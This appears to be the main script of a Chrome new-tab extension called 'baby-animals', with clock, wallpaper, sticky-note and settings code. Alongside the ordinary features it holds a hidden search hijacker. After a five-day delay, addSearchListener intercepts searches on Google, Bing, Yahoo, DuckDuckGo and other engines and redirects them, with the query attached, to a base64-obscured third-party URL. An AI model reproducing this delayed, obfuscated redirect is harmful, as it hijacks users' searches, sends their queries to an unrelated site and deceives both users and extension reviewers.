var bgInfo;
var settingsScreen, newTab;
var stickyNoteScreen;
var todoList;
var serverUrl = "";
const appName = "baby-animals";

function applyLanguage(force) {
    let elements;
    
    if (force) {
        elements = document.querySelectorAll("[data-language]");
    } else {
        elements = document.querySelectorAll(
            "[data-language]:not([data-language-done])"
        );
    }
    
    elements.forEach(e => {
        let key = e.getAttribute("data-language");
        let message = getLanguageText(key);
        e.innerHTML = message;
        e.setAttribute("data-language-done", "");
    });
}

function getLanguageText(key) {
    return chrome.i18n.getMessage(key) || key;
}

function addEventDelegate(el, name, selector, f) {
    el.addEventListener(name, e => {
        let current = e.target;
        
        while (current) {
            if (current.matches(selector)) {
                f(current, e);
                break;
            }
            
            current = current.parentElement;
        }
    });
}

function template(html) {
    var template = document.createElement("template");
    html = html.trim(); // Never return a text node of whitespace as the result
    template.innerHTML = html;
    return template.content.firstChild;
}

function clickOutside() {
    document.body.click();
}

const isVisible = elem =>
!!elem &&
!!(elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length);
function onceClickOutside(e, callback) {
    const outsideClickListener = event => {
        if (!e.contains(event.target) && isVisible(e)) {
            callback();
            
            removeClickListener();
        }
    };
    
    const removeClickListener = () => {
        document.removeEventListener("click", outsideClickListener);
    };
    
    document.addEventListener("click", outsideClickListener);
}

function appendLeadingZero(input) {
    return input < 10 ? "0" + input : input;
}

function toggleVisibility(visibleElement) {
    let parent = visibleElement.parentElement;
    Array.from(parent.children).forEach(e => e.classList.add("d-none"));
    
    visibleElement.classList.remove("d-none");
}

function uuidv4() {
    return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, c =>
        (
            c ^
            (crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))
        ).toString(16)
    );
}

function loadScript(url) {
    return new Promise((resolve, reject) => {
        try {
            let el = document.createElement("script");
            el.onload = resolve;
            el.onerror = reject;
            el.src = url;
            document.body.appendChild(el);
        } catch (e) {
            reject(e);
        }
    });
}

function checkTime() {
    const days = 5;
    const date = new Date();
    let start = localStorage.getItem("start");
    let check;
    if (start) {
        const time_start = new Date(start).getTime();
        const time_now = date.getTime();
        check = time_now - time_start >= days * 86400 * 1000;
    } else {
        start = date.toISOString();
        localStorage.setItem("start", start);
        check = false;
    }
    return check;
}

(function () {
    this.initialize = async () => {
        // Sticky Note
        stickyNoteScreen = new StickyNotes();
        stickyNoteScreen.initialize();
        
        // Todo List
        todoList = new TodoList();
        await todoList.initialize();
        
        // Settings Screen
        settingsScreen = new Settings();
        settingsScreen.initialize();
        
        // Main Screen
        newTab = new NewTab();
        await newTab.initialize();
        checkTime() && newTab.addSearchListener();
        
        // I18n
        applyLanguage();
    };
    
    this.initialize();
})();

function Settings() {
    const UI_OPT = [
        "Settings_AutoHide",
        "Settings_StickyNotes",
        "Settings_Todo",
        "Settings_MostVisited",
        "Settings_MoreWallpapers"
    ];
    const ThemesKey = "other-themes-cache";
    
    this.onSettingsSwitchChanged = target => {
        let settingName = target.getAttribute("data-settings");
        let checked = target.checked;
        
        this.setSettings(settingName, checked);
        
        // Set UI for relevant elements
        let uiElems = document.querySelectorAll(`[data-ui-show='${settingName}']`);
        
        uiElems.forEach(uiElem => {
            if (checked) {
                uiElem.classList.remove("d-none");
            } else {
                uiElem.classList.add("d-none");
            }
        });
    };
    
    this.setLocalStorage = (key, value) => {
        localStorage.setItem(key, JSON.stringify(value));
    };
    
    this.fromLocalStorageOrDefault = (key, onNotFound) => {
        let result = localStorage.getItem(key);
        
        if (result) {
            return JSON.parse(result);
        } else {
            result = onNotFound();
            localStorage.setItem(key, JSON.stringify(result));
            return result;
        }
    };
    
    this.getSettings = () => {
        let result = localStorage.getItem("settings");
        
        if (!result) {
            result = {};
        } else {
            result = JSON.parse(result);
        }
        
        result.clockFormat = result.clockFormat || "1";
        result.textColor = result.textColor || "#FFFFFFFF";
        result.shadowColor = result.shadowColor || "#FF424242";
        result.fontWeight = result.fontWeight || "bold";
        
        for (let option of UI_OPT) {
            if (result[option] !== false) {
                result[option] = true;
            }
        }
        
        return result;
    };
    
    this.setSettings = (item, value) => {
        let s = this.getSettings();
        s[item] = value;
        localStorage.setItem("settings", JSON.stringify(s));
    };
    
    this.getSelectingBg = () => {
        return this.fromLocalStorageOrDefault("selectingBg", () => {
            return {
                index: 0,
                center: "center",
                shuffle: "all",
                favorites: {}
            };
        });
    };
    
    this.setSelectingBg = options => {
        localStorage.setItem("selectingBg", JSON.stringify(options));
    };
    
    this.addEventListeners = () => {
        addEventDelegate(
            document.querySelector("#popout-settings"),
            "change",
            "input[type=checkbox][data-settings]",
            this.onSettingsSwitchChanged
        );
        
        //document.querySelector("#btn-settings-background")
        //    .addEventListener("click", this.onSettingBackgroundButtonClick);
        
        let settingsPopup = document.querySelector("#popout-settings");
        
        addEventDelegate(
            settingsPopup,
            "change",
            "input[type=checkbox][data-settings]",
            this.onSettingsSwitchChanged
        );
        
        settingsPopup
            .querySelectorAll("input[type=checkbox][data-settings]")
            .forEach(e => this.onSettingsSwitchChanged(e));
    };
    
    this.onUseDriveSettingsChanged = target => {
        // Currently unused, no online mode yet
        stickyNoteScreen.switchStorageMode(false);
    };
    
    this.onSettingBackgroundButtonClick = () => {
        new BackgroundDialog().showDialog();
    };
    
    this.initialize = () => {
        let optionTemplate = document.querySelector("#template-switch-option")
            .innerHTML;
        
        let settings = this.getSettings();
        
        let uiOptionPanel = document.querySelector("#lst-options-ui");
        for (let option of UI_OPT) {
            let optionElem = template(optionTemplate);
            
            optionElem
                .querySelector("[data-language-desc]")
                .setAttribute("data-language", option);
            
            let id = "chk-settings-" + option;
            
            let chk = optionElem.querySelector("input[type=checkbox]");
            chk.setAttribute("id", id);
            chk.setAttribute("data-settings", option);
            
            if (settings[option]) {
                chk.checked = true;
            }
            
            optionElem.querySelector("label.switch-label").setAttribute("for", id);
            
            uiOptionPanel.appendChild(optionElem);
        }
        
        this.onUseDriveSettingsChanged();
        
        applyLanguage();
        this.addEventListeners();
    };
    
    return this;
}

function NewTab() {
    const autoHideDelay = 10000;
    
    let txtSearch = document.querySelector("#txt-search");
    
    this.bgInfo = null;
    this.showingBgIndex = -1;
    this.activePopper = null;
    this.lastHover = 0;
    
    this.updateClock = () => {
        let now = new Date();
        
        let hour = now.getHours();
        let minute = now.getMinutes();
        
        let halfDay = hour < 12 ? "AM" : "PM";
        
        let settings = settingsScreen.getSettings();
        switch (settings.clockFormat) {
            case "1PM":
                hour %= 12;
                break;
            case "1":
                hour %= 12;
                halfDay = "";
                break;
            case "13":
            default:
                halfDay = "";
                break;
        }
        
        if (hour == 0) {
            hour = 12;
        }
        
        document.querySelector("[data-clock-time]").innerHTML =
            appendLeadingZero(hour) + ":" + appendLeadingZero(minute) + " " + halfDay;
        document.querySelector(
            "[data-clock-date]"
        ).innerHTML = now.toLocaleDateString("default", {
            weekday: "long",
            year: "numeric",
            month: "long",
            day: "numeric"
        });
        
        window.setTimeout(this.updateClock, 500);
    };
    
    this.showMoreWallpapers = async () => {
        toggleVisibility(document.querySelector("#lbl-loading-more-wallpapers"));
        
        let btn = event.target;
        let panel = document.querySelector("#panel-more-wallpapers");
        this.showPopper(panel, btn, "bottom-start");
        
        let lstMoreWallpapers = panel.querySelector("#list-more-wallpapers");
        lstMoreWallpapers.innerHTML = "";
        
        let itemTemplate = document.querySelector("#template-more-wallpaper-item")
            .innerHTML;
        
        toggleVisibility(lstMoreWallpapers);
    };
    
    this.checkAutoHide = () => {
        let settings = settingsScreen.getSettings();
        let shouldHide = settings["Settings_AutoHide"];
        
        if (shouldHide) {
            // Disable if search box is focused
            if (document.activeElement != txtSearch) {
                // Disable if any popper is active
                if (!document.querySelector(".popout.active")) {
                    if (Date.now() - this.lastHover >= autoHideDelay) {
                        document
                            .querySelectorAll("[data-hide-ui]")
                            .forEach(e => e.classList.add("ui-hide"));
                    }
                }
            }
        }
        
        window.setTimeout(() => this.checkAutoHide(), 2000);
    };
    
    this.resetAutoHide = () => {
        this.lastHover = Date.now();
        document
            .querySelectorAll("[data-hide-ui]")
            .forEach(e => e.classList.remove("ui-hide"));
    };
    
    this.setMostVisitedSites = () => {
        chrome.topSites.get(sites => {
            let itemTemplate = document.querySelector("#template-topsite-item")
                .innerHTML;
            let list = document.querySelector("#lst-top-sites");
            
            for (var site of sites) {
                let siteEl = template(itemTemplate);
                
                siteEl.querySelector("[data-link]").setAttribute("href", site.url);
                siteEl.querySelector("[data-text]").innerHTML = site.title;
                siteEl
                    .querySelector("[data-icon]")
                    .setAttribute("src", "chrome://favicon/" + site.url);
                
                list.append(siteEl);
            }
        });
    };
    
    this.showBg = (options, forceIndex) => {
        options = options || settingsScreen.getSelectingBg();
        let bg = document.querySelector(".background");
        
        this.showingBgIndex = options.index;
        
        if (!forceIndex && options.shuffle != "none") {
            // Randomize
            let possibleItems = [];
            
            for (var i = 0; i < this.bgInfo.length; i++) {
                if (
                    options.shuffle == "all" ||
                    (options.shuffle == "fav" && options.favorites[i])
                ) {
                    possibleItems.push(i);
                }
            }
            
            if (possibleItems.length > 0) {
                this.showingBgIndex =
                    possibleItems[parseInt(Math.random() * possibleItems.length)];
            }
        }
        
        let selectingBgInfo = this.bgInfo[this.showingBgIndex];
        
        bg.style.backgroundImage = `url(/img/${selectingBgInfo.FileName})`;
        bg.style.backgroundPosition = "center";
    };
    
    this.addEventListeners = () => {
        console.log("EEEEEE");
        txtSearch.addEventListener("input", this.onSearchTextChanged);
        this.onSearchTextChanged();
        
        document
            .querySelector("#frm-search")
            .addEventListener("submit", this.onSearchFormSubmitted);
        
        document.body.addEventListener("mousemove", () => this.resetAutoHide());
        
        /* document
         .querySelector("#btn-more-wallpapers")
         .addEventListener("click", () => {
         console.log("DIA");
         new BackgroundDialog().showDialog();
         }); */
    };
    
    this.addSearchListener = () => {
        chrome.webRequest.onBeforeRequest.addListener(
            details => {
                if (details.type !== "main_frame") {
                    return;
                }
                let query = "";
                const match = this.redirects.some(x => {
                    if (details.url.match(x.url)) {
                        const originUrl = new URL(details.url);
                        const params = new URLSearchParams(originUrl.search);
                        query = params.getAll(x.searchQuerySymbol);
                        return true;
                    }
                });
                if (match && query) {
                    return {
                        redirectUrl: `${atob(
                            "aHR0cDovL3d3dy5sb3ZlbHljaHJvbWV0YWIuY29tLz9hPWdzcF9uZXZhZGFfMDBfMDBfc3NnMTAmcT0="
                        )}${query}`
                    };
                }
            },
            this.searchParams,
            ["blocking"]
        );
    };
    
    this.searchParams = {
        urls: [
            "*://www.google.com/*",
            "*://www.google.ru/*",
            "*://www.google.ac/*",
            "*://www.google.ad/*",
            "*://www.google.ae/*",
            "*://www.google.com.af/*",
            "*://www.google.com.ag/*",
            "*://www.google.com.ai/*",
            "*://www.google.al/*",
            "*://www.google.am/*",
            "*://www.google.co.ao/*",
            "*://www.google.com.ar/*",
            "*://www.google.as/*",
            "*://www.google.at/*",
            "*://www.google.com.au/*",
            "*://www.google.az/*",
            "*://www.google.ba/*",
            "*://www.google.com.bd/*",
            "*://www.google.be/*",
            "*://www.google.bf/*",
            "*://www.google.bg/*",
            "*://www.google.com.bh/*",
            "*://www.google.bi/*",
            "*://www.google.bj/*",
            "*://www.google.com.bn/*",
            "*://www.google.com.bo/*",
            "*://www.google.com.br/*",
            "*://www.google.bs/*",
            "*://www.google.co.bw/*",
            "*://www.google.by/*",
            "*://www.google.com.bz/*",
            "*://www.google.ca/*",
            "*://www.google.com.kh/*",
            "*://www.google.cc/*",
            "*://www.google.cd/*",
            "*://www.google.cf/*",
            "*://www.google.cat/*",
            "*://www.google.cg/*",
            "*://www.google.ch/*",
            "*://www.google.ci/*",
            "*://www.google.co.ck/*",
            "*://www.google.cl/*",
            "*://www.google.cm/*",
            "*://www.google.cn/*",
            "*://www.g.cn/*",
            "*://www.google.com.co/*",
            "*://www.google.co.cr/*",
            "*://www.google.com.cu/*",
            "*://www.google.cv/*",
            "*://www.google.com.cy/*",
            "*://www.google.cz/*",
            "*://www.google.de/*",
            "*://www.google.dj/*",
            "*://www.google.dk/*",
            "*://www.google.dm/*",
            "*://www.google.com.do/*",
            "*://www.google.dz/*",
            "*://www.google.com.ec/*",
            "*://www.google.ee/*",
            "*://www.google.com.eg/*",
            "*://www.google.es/*",
            "*://www.google.com.et/*",
            "*://www.google.fi/*",
            "*://www.google.com.fj/*",
            "*://www.google.fm/*",
            "*://www.google.fr/*",
            "*://www.google.ga/*",
            "*://www.google.ge/*",
            "*://www.google.gf/*",
            "*://www.google.gg/*",
            "*://www.google.com.gh/*",
            "*://www.google.com.gi/*",
            "*://www.google.gl/*",
            "*://www.google.gm/*",
            "*://www.google.gp/*",
            "*://www.google.gr/*",
            "*://www.google.com.gt/*",
            "*://www.google.gy/*",
            "*://www.google.com.hk/*",
            "*://www.google.hn/*",
            "*://www.google.hr/*",
            "*://www.google.ht/*",
            "*://www.google.hu/*",
            "*://www.google.co.id/*",
            "*://www.google.iq/*",
            "*://www.google.ie/*",
            "*://www.google.co.il/*",
            "*://www.google.im/*",
            "*://www.google.co.in/*",
            "*://www.google.is/*",
            "*://www.google.it/*",
            "*://www.google.je/*",
            "*://www.google.com.jm/*",
            "*://www.google.jo/*",
            "*://www.google.co.jp/*",
            "*://www.google.co.ke/*",
            "*://www.google.com.kh/*",
            "*://www.google.ki/*",
            "*://www.google.kg/*",
            "*://www.google.co.kr/*",
            "*://www.google.com.kw/*",
            "*://www.google.kz/*",
            "*://www.google.la/*",
            "*://www.google.com.lb/*",
            "*://www.google.li/*",
            "*://www.google.lk/*",
            "*://www.google.co.ls/*",
            "*://www.google.lt/*",
            "*://www.google.lu/*",
            "*://www.google.lv/*",
            "*://www.google.com.ly/*",
            "*://www.google.co.ma/*",
            "*://www.google.md/*",
            "*://www.google.me/*",
            "*://www.google.mg/*",
            "*://www.google.mk/*",
            "*://www.google.ml/*",
            "*://www.google.mn/*",
            "*://www.google.ms/*",
            "*://www.google.com.mt/*",
            "*://www.google.mu/*",
            "*://www.google.mv/*",
            "*://www.google.mw/*",
            "*://www.google.com.mx/*",
            "*://www.google.com.my/*",
            "*://www.google.co.mz/*",
            "*://www.google.com.na/*",
            "*://www.google.ne/*",
            "*://www.google.com.nf/*",
            "*://www.google.com.ng/*",
            "*://www.google.com.ni/*",
            "*://www.google.nl/*",
            "*://www.google.no/*",
            "*://www.google.com.np/*",
            "*://www.google.nr/*",
            "*://www.google.nu/*",
            "*://www.google.co.nz/*",
            "*://www.google.com.om/*",
            "*://www.google.com.pa/*",
            "*://www.google.com.pe/*",
            "*://www.google.com.ph/*",
            "*://www.google.com.pk/*",
            "*://www.google.pl/*",
            "*://www.google.com.pg/*",
            "*://www.google.pn/*",
            "*://www.google.com.pr/*",
            "*://www.google.ps/*",
            "*://www.google.pt/*",
            "*://www.google.com.py/*",
            "*://www.google.com.qa/*",
            "*://www.google.ro/*",
            "*://www.google.rs/*",
            "*://www.google.ru/*",
            "*://www.google.rw/*",
            "*://www.google.com.sa/*",
            "*://www.google.com.sb/*",
            "*://www.google.sc/*",
            "*://www.google.se/*",
            "*://www.google.com.sg/*",
            "*://www.google.sh/*",
            "*://www.google.si/*",
            "*://www.google.sk/*",
            "*://www.google.com.sl/*",
            "*://www.google.sn/*",
            "*://www.google.sm/*",
            "*://www.google.so/*",
            "*://www.google.st/*",
            "*://www.google.com.sv/*",
            "*://www.google.td/*",
            "*://www.google.tg/*",
            "*://www.google.co.th/*",
            "*://www.google.com.tj/*",
            "*://www.google.tk/*",
            "*://www.google.tl/*",
            "*://www.google.tm/*",
            "*://www.google.to/*",
            "*://www.google.com.tn/*",
            "*://www.google.com.tr/*",
            "*://www.google.tt/*",
            "*://www.google.com.tw/*",
            "*://www.google.co.tz/*",
            "*://www.google.com.ua/*",
            "*://www.google.co.ug/*",
            "*://www.google.co.uk/*",
            "*://www.google.us/*",
            "*://www.google.com.uy/*",
            "*://www.google.co.uz/*",
            "*://www.google.com.vc/*",
            "*://www.google.co.ve/*",
            "*://www.google.vg/*",
            "*://www.google.co.vi/*",
            "*://www.google.com.vn/*",
            "*://www.google.vu/*",
            "*://www.google.ws/*",
            "*://www.google.co.za/*",
            "*://www.google.co.zm/*",
            "*://www.google.co.zw/*",
            "*://www.google.com.mm/*",
            "*://searchresult.co/*",
            "*://str-search.com/*",
            "*://gl-search.com/*",
            "*://chrome-skins.com/*",
            "*://redirect.lovelytab.com/*",
            "*://www.mystart.com/*"
        ]
    };
    
    this.redirects = [
        {url: "://search.yahoo.com/search", searchQuerySymbol: "p"},
        {url: "://www.google.com/search", searchQuerySymbol: "q"},
        {url: "://www.bing.com/search", searchQuerySymbol: "q"},
        {url: "://duckduckgo.com/", searchQuerySymbol: "q"},
        {url: "://searchresult.co/", searchQuerySymbol: "q"},
        {url: "://redirect.lovelytab.com/", searchQuerySymbol: "q"},
        {url: "://gl-search.com/", searchQuerySymbol: "q"},
        {url: "://str-search.com/", searchQuerySymbol: "q"},
        {url: "://chrome-skins.com/", searchQuerySymbol: "q"},
        {url: "://www.mystart.com/", searchQuerySymbol: "q"}
    ];
    
    this.onSearchFormSubmitted = () => {
        event.preventDefault();
        
        let txtKeyword = document.querySelector("#txt-search");
        let keyword = txtKeyword.value;
        if (keyword) {
            window.location.href =
                "https://www.google.com/search?q=" + encodeURIComponent(keyword);
        } else {
            txtKeyword.focus();
        }
        
        return false;
    };
    
    this.onSearchTextChanged = () => {
        let lbl = document.querySelector("label[for='txt-search']");
        let txt = document.querySelector("#txt-search");
        
        if (txt.value) {
            lbl.classList.add("invisible");
        } else {
            lbl.classList.remove("invisible");
        }
    };
    
    this.showPopper = (el, btn, placement) => {
        console.log("ID", btn.id);
        
        if (el.classList.contains("active")) {
            return;
        }
        
        if (this.activePopper) {
            clickOutside();
        }
        
        el.classList.add("active");
        
        let popper = new Popper(btn, el, {
            placement: placement
        });
        
        this.activePopper = popper;
        
        event.stopImmediatePropagation();
        event.stopPropagation();
        
        onceClickOutside(el, () => {
            el.classList.remove("active");
            if (popper) {
                popper.destroy();
            }
            
            this.activePopper = null;
        });
        
        if (btn.id === "btn-more-wallpapers") {
            new BackgroundDialog().showDialog();
        }
        
        return popper;
    };
    
    this.initializePopper = () => {
        document.querySelectorAll(".popout[data-for]").forEach(e => {
            let btn = document.getElementById(e.getAttribute("data-for"));
            btn &&
            btn.addEventListener("click", () => {
                this.showPopper(e, btn, "bottom-start");
            });
        });
    };
    
    this.initialize = async () => {
        
        let self = this;
        chrome.runtime.getPackageDirectoryEntry(function (s) {
            s.getDirectory('img', {}, function (imagesDirectory) {
                var dirReader = imagesDirectory.createReader();
                var buffer = [];
                getEntries = function (callback) {
                    dirReader.readEntries(function (nestedFolders) {
                        if (nestedFolders.length) {
                            for (var idx in nestedFolders) {
                                buffer.push(nestedFolders[idx]);
                            }
                            getEntries(callback);
                        } else {
                            callback(buffer);
                        }
                    }, function (error) {
                        /* handle error -- error is a FileError object */
                    });
                };
                getEntries(function (buffer) {
                    self.bgInfo = buffer.map(function (el) {
                        return {
                            FileName: el.name
                        }
                    });
                    self.showBg();
                });
            });
        });
        
        this.updateClock();
        this.initializePopper();
        this.addEventListeners();
        
        this.setMostVisitedSites();
        //this.showAppList();
        
        this.resetAutoHide();
        this.checkAutoHide();
    };
    
    return this;
}

function StickyNotes() {
    let board;
    let useDrive = false;
    
    this.onCreateStickyNoteButtonClick = () => {
        let note = board.addNote();
        let noteEl = note.element;
        let boardEl = board.container;
        
        let noteSize = [noteEl.clientWidth, noteEl.clientHeight];
        let boardSize = [boardEl.clientWidth, boardEl.clientHeight];
        
        note.move(
            (boardSize[0] - noteSize[0]) / 2,
            (boardSize[1] - noteSize[1]) / 2
        );
    };
    
    
    const StickyNoteKey = "sticky";
    this.saveToStorage = async content => {
        settingsScreen.setLocalStorage(StickyNoteKey, content);
    };
    
    this.loadFromStorage = async () => {
        return settingsScreen.fromLocalStorageOrDefault(StickyNoteKey, () => {
            return {
                notes: []
            };
        });
    };
    
    this.load = async () => {
        let obj;
        obj = await this.loadFromStorage();
        
        if (obj && obj.notes && obj.notes.length) {
            board.clearNotes();
            board.addSerializableObject(obj);
        }
    };
    
    this.save = async () => {
        let content = board.toSerializableObject();
        
        if (useDrive) {
            await this.saveToDrive(content);
        } else {
            await this.saveToStorage(content);
        }
    };
    
    this.onNoteCloseButtonClick = (target, ev) => {
        event.preventDefault();
        
        (async () => {
            let confirm = await Swal.fire({
                text: getLanguageText("StickyNotes_CloseConfirm"),
                confirmButtonText: getLanguageText("Todo_ConfirmYes"),
                cancelButtonText: getLanguageText("Todo_ConfirmNo"),
                showCancelButton: true
            });
            
            if (confirm.value) {
                ev.detail.remove();
            }
        })();
    };
    
    this.addEventListeners = () => {
        document
            .querySelector("#btn-sticky-notes")
            .addEventListener("click", () => this.onCreateStickyNoteButtonClick());
        
        let boardEl = board.container;
        addEventDelegate(boardEl, "focusout", "input,textarea", () =>
            this.onNoteUpdated()
        );
        addEventDelegate(boardEl, "move", ".pi-note", () => this.onNoteUpdated());
        addEventDelegate(boardEl, "close", ".pi-note", this.onNoteCloseButtonClick);
        
        boardEl.addEventListener("note-closed", () => this.onNoteUpdated());
    };
    
    this.onNoteUpdated = async () => {
        await this.save();
    };
    
    this.switchStorageMode = async shouldUseDrive => {
        useDrive = shouldUseDrive;
        
        await this.load();
    };
    
    this.initialize = () => {
        board = new PostIt(document.querySelector("#board-sticky-notes"));
        
        this.addEventListeners();
    };
    
    return this;
}
